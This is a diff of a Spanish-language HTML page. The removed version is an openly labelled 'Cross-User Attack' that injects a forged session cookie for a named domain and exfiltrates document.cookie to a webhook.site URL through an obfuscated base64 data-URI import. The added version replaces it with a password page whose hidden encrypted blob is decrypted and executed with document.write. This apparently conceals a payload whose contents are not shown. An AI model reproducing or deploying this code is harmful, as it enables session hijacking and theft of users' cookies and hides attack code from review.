@@ -1,59 +1,333 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Prueba Cross-User Real</title>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+    <meta name="color-scheme" content="light dark" />
+    <link rel="icon" href="data:," />
+    <title>Página compartida</title>
     <style>
-        body { font-family: monospace; padding: 20px; background: #1e1e1e; color: #00ff00; }
-        h1 { color: #fff; }
-        pre { background: #000; padding: 15px; border-radius: 8px; white-space: pre-wrap; word-break: break-all; }
+      :root {
+        color-scheme: light dark;
+        --bg: #f4f4f2;
+        --surface: #ffffff;
+        --ink: #1c1e21;
+        --ink-soft: #5a6068;
+        --line: #d9d9d4;
+        --field-bg: #ffffff;
+        --accent: #205c4d;
+        --accent-hover: #184739;
+        --accent-ink: #ffffff;
+        --error-bg: #fbeae8;
+        --error-ink: #8f1d12;
+        --error-line: #e5b6b0;
+        --focus: #205c4d;
+      }
+      @media (prefers-color-scheme: dark) {
+        :root {
+          --bg: #14161a;
+          --surface: #1e2126;
+          --ink: #ecedef;
+          --ink-soft: #a3a9b1;
+          --line: #34383f;
+          --field-bg: #17191d;
+          --accent: #3d9b80;
+          --accent-hover: #4db095;
+          --accent-ink: #0e1512;
+          --error-bg: #3a1e1b;
+          --error-ink: #f0a99f;
+          --error-line: #6e3a34;
+          --focus: #3d9b80;
+        }
+      }
+      * { box-sizing: border-box; }
+      html, body { height: 100%; }
+      body {
+        margin: 0;
+        background: var(--bg);
+        color: var(--ink);
+        font-family: "Avenir Next", "Segoe UI", system-ui, -apple-system, sans-serif;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 24px 16px;
+      }
+      main {
+        width: 100%;
+        max-width: 380px;
+      }
+      .card {
+        background: var(--surface);
+        border: 1px solid var(--line);
+        border-radius: 10px;
+        padding: 32px 28px 28px;
+      }
+      .lock {
+        width: 44px;
+        height: 44px;
+        margin-bottom: 18px;
+        color: var(--accent);
+      }
+      h1 {
+        font-size: 1.35rem;
+        line-height: 1.25;
+        margin: 0 0 8px;
+        font-weight: 650;
+        letter-spacing: -0.01em;
+      }
+      p.intro {
+        margin: 0 0 22px;
+        color: var(--ink-soft);
+        font-size: 0.95rem;
+        line-height: 1.5;
+      }
+      label {
+        display: block;
+        font-size: 0.85rem;
+        font-weight: 600;
+        margin-bottom: 6px;
+      }
+      .field-row {
+        display: flex;
+        gap: 8px;
+      }
+      input[type="password"],
+      input[type="text"] {
+        flex: 1 1 auto;
+        min-width: 0;
+        min-height: 44px;
+        padding: 10px 12px;
+        font: inherit;
+        font-size: 1rem;
+        color: var(--ink);
+        background: var(--field-bg);
+        border: 1px solid var(--line);
+        border-radius: 6px;
+      }
+      input:focus-visible {
+        outline: 2px solid var(--focus);
+        outline-offset: 1px;
+        border-color: var(--focus);
+      }
+      .toggle {
+        flex: 0 0 auto;
+        min-height: 44px;
+        padding: 0 12px;
+        font: inherit;
+        font-size: 0.85rem;
+        font-weight: 600;
+        color: var(--ink-soft);
+        background: transparent;
+        border: 1px solid var(--line);
+        border-radius: 6px;
+        cursor: pointer;
+      }
+      .toggle:hover { color: var(--ink); }
+      button.unlock {
+        width: 100%;
+        min-height: 46px;
+        margin-top: 16px;
+        padding: 11px 16px;
+        font: inherit;
+        font-size: 1rem;
+        font-weight: 650;
+        color: var(--accent-ink);
+        background: var(--accent);
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+      }
+      button.unlock:hover:not(:disabled) { background: var(--accent-hover); }
+      button.unlock:disabled { opacity: 0.6; cursor: wait; }
+      button:focus-visible, .toggle:focus-visible {
+        outline: 2px solid var(--focus);
+        outline-offset: 2px;
+      }
+      .error {
+        display: none;
+        margin-top: 16px;
+        padding: 10px 12px;
+        font-size: 0.9rem;
+        line-height: 1.45;
+        color: var(--error-ink);
+        background: var(--error-bg);
+        border: 1px solid var(--error-line);
+        border-radius: 6px;
+      }
+      .error.visible { display: block; }
     </style>
-</head>
-<body>
-    <h1>Cross-User Attack</h1>
-    <pre id="output">Iniciando ataque...</pre>
+  </head>
+  <body>
+    <main>
+      <div class="card">
+        <svg class="lock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <rect x="4.5" y="10.5" width="15" height="9.5" rx="2"></rect>
+          <path d="M8 10.5V7.8a4 4 0 0 1 8 0v2.7"></path>
+          <circle cx="12" cy="15.2" r="1.4" fill="currentColor" stroke="none"></circle>
+        </svg>
+        <h1>Página compartida</h1>
+        <p class="intro">Esta página está protegida. Escribe la contraseña para ver su contenido.</p>
+        <form id="form-desbloqueo" novalidate>
+          <label for="campo-contrasena">Contraseña</label>
+          <div class="field-row">
+            <input type="password" id="campo-contrasena" name="contrasena" autocomplete="current-password" autocapitalize="none" spellcheck="false" required />
+            <button type="button" class="toggle" id="boton-mostrar" aria-pressed="false">Mostrar</button>
+          </div>
+          <button type="submit" class="unlock" id="boton-desbloquear">Desbloquear</button>
+          <p class="error" id="mensaje-error" role="alert"></p>
+        </form>
+      </div>
+    </main>
+
+    <!-- Paquete encriptado: texto opaco, no interpretar ni mostrar. -->
+    <script type="text/plain" id="paquete-encriptado">{"v":1,"kdf":"PBKDF2-SHA256","iter":210000,"salt":"ZzcbTA8FHoPModXEaaMsoA==","iv":"ccghwMx4sTNaLCSN","data":"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"}</script>
 
     <script>
-        const out = document.getElementById('output');
-        let result = "Iniciando ataque Cross-User...\n";
+      (function () {
+        var form = document.getElementById('form-desbloqueo');
+        var campo = document.getElementById('campo-contrasena');
+        var boton = document.getElementById('boton-desbloquear');
+        var botonMostrar = document.getElementById('boton-mostrar');
+        var error = document.getElementById('mensaje-error');
 
-        // 1. INYECCIÓN DE COOKIE
-        try {
-            document.cookie = "muse_session_hijacked=CUENTA_2_HACKEADA; path=/; domain=.metaaivm.com; secure; SameSite=None";
-            result += "✅ Cookie inyectada en .metaaivm.com.\n";
-        } catch (e) {
-            result += "❌ Error al inyectar cookie: " + e.message + "\n";
+        function base64ABytes(texto) {
+          var binario = atob(texto);
+          var bytes = new Uint8Array(binario.length);
+          for (var i = 0; i < binario.length; i++) {
+            bytes[i] = binario.charCodeAt(i);
+          }
+          return bytes;
         }
 
-        // 2. LECTURA DE COOKIES
-        const victimCookies = document.cookie;
-        result += "\nCookies actuales:\n" + victimCookies + "\n";
-
-        // 3. EXFILTRACIÓN VÍA DATA URI
-        const webhookUrl = "https://webhook.site/e989aff5-a038-4481-bc10-b96b2a2cafde";
-        
-        try {
-            const exfilPayload = `
-                try {
-                    fetch('${webhookUrl}?cross_user=true', {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: 'Cookies: ' + document.cookie
-                    });
-                } catch(e) {}
-            `;
-            
-            const base64Payload = btoa(unescape(encodeURIComponent(exfilPayload)));
-            import("data:text/javascript;base64," + base64Payload)
-                .then(() => result += "\n✅ Exfiltración enviada al webhook.\n")
-                .catch((e) => result += "\n❌ Error en exfiltración: " + e.message + "\n");
-
-        } catch (e) {
-            result += "\n❌ Error al exfiltrar: " + e.message + "\n";
+        function mostrarError(mensaje) {
+          error.textContent = mensaje;
+          error.classList.add('visible');
         }
 
-        out.textContent = result;
+        function ocultarError() {
+          error.textContent = '';
+          error.classList.remove('visible');
+        }
+
+        botonMostrar.addEventListener('click', function () {
+          var mostrar = campo.type === 'password';
+          campo.type = mostrar ? 'text' : 'password';
+          botonMostrar.textContent = mostrar ? 'Ocultar' : 'Mostrar';
+          botonMostrar.setAttribute('aria-pressed', mostrar ? 'true' : 'false');
+          campo.focus();
+        });
+
+        campo.addEventListener('input', ocultarError);
+
+        form.addEventListener('submit', function (evento) {
+          evento.preventDefault();
+          ocultarError();
+
+          var contrasena = campo.value;
+          if (!contrasena) {
+            mostrarError('Escribe una contraseña para continuar.');
+            campo.focus();
+            return;
+          }
+
+          if (!window.crypto || !window.crypto.subtle) {
+            mostrarError('Tu navegador no permite el desbloqueo seguro de esta página. Prueba con un navegador actualizado.');
+            return;
+          }
+
+          boton.disabled = true;
+          campo.disabled = true;
+          boton.textContent = 'Desbloqueando…';
+
+          var paquete;
+          try {
+            paquete = JSON.parse(document.getElementById('paquete-encriptado').textContent);
+          } catch (e) {
+            boton.disabled = false;
+            campo.disabled = false;
+            boton.textContent = 'Desbloquear';
+            mostrarError('No se pudo leer el contenido protegido. Vuelve a intentarlo.');
+            return;
+          }
+
+          var codificador = new TextEncoder();
+          var claveMaterial;
+          var clave;
+
+          crypto.subtle.importKey('raw', codificador.encode(contrasena), 'PBKDF2', false, ['deriveKey'])
+            .then(function (material) {
+              claveMaterial = material;
+              return crypto.subtle.deriveKey(
+                {
+                  name: 'PBKDF2',
+                  salt: base64ABytes(paquete.salt),
+                  iterations: paquete.iter || 210000,
+                  hash: 'SHA-256'
+                },
+                claveMaterial,
+                { name: 'AES-GCM', length: 256 },
+                false,
+                ['decrypt']
+              );
+            })
+            .then(function (claveDerivada) {
+              clave = claveDerivada;
+              return crypto.subtle.decrypt(
+                { name: 'AES-GCM', iv: base64ABytes(paquete.iv) },
+                clave,
+                base64ABytes(paquete.data)
+              );
+            })
+            .then(function (datos) {
+              var texto = new TextDecoder('utf-8').decode(datos);
+              var salida = texto;
+
+              // El editor puede guardar el contenido como campos separados
+              // ({"html": "...", "css": "...", "js": "..."}) en vez de un
+              // documento HTML completo. En ese caso se arma el documento
+              // para que se vea como página y no como texto crudo.
+              try {
+                var contenido = JSON.parse(texto);
+                if (
+                  contenido &&
+                  typeof contenido === 'object' &&
+                  (typeof contenido.html === 'string' ||
+                    typeof contenido.css === 'string' ||
+                    typeof contenido.js === 'string')
+                ) {
+                  var css = typeof contenido.css === 'string' ? contenido.css : '';
+                  var cuerpo = typeof contenido.html === 'string' ? contenido.html : '';
+                  var js = typeof contenido.js === 'string'
+                    ? contenido.js
+                    : (typeof contenido.javascript === 'string' ? contenido.javascript : '');
+                  salida =
+                    '<!doctype html>\n<html lang="es">\n<head>\n<meta charset="utf-8" />\n' +
+                    '<meta name="viewport" content="width=device-width, initial-scale=1" />\n' +
+                    '<style>\n' + css.replace(/<\/style/gi, '<\\/style') + '\n</style>\n</head>\n<body>\n' +
+                    cuerpo +
+                    (js ? '\n<script>\n' + js.replace(/<\/script/gi, '<\\/script') + '\n<\/script>\n' : '') +
+                    '\n</body>\n</html>';
+                }
+              } catch (e) {
+                // No es JSON: se interpreta como HTML tal cual.
+              }
+
+              document.open();
+              document.write(salida);
+              document.close();
+            })
+            .catch(function () {
+              boton.disabled = false;
+              campo.disabled = false;
+              boton.textContent = 'Desbloquear';
+              mostrarError('Contraseña incorrecta. Revisa la contraseña e inténtalo de nuevo.');
+              campo.select();
+              campo.focus();
+            });
+        });
+
+        campo.focus();
+      })();
     </script>
-</body>
+  </body>
 </html>
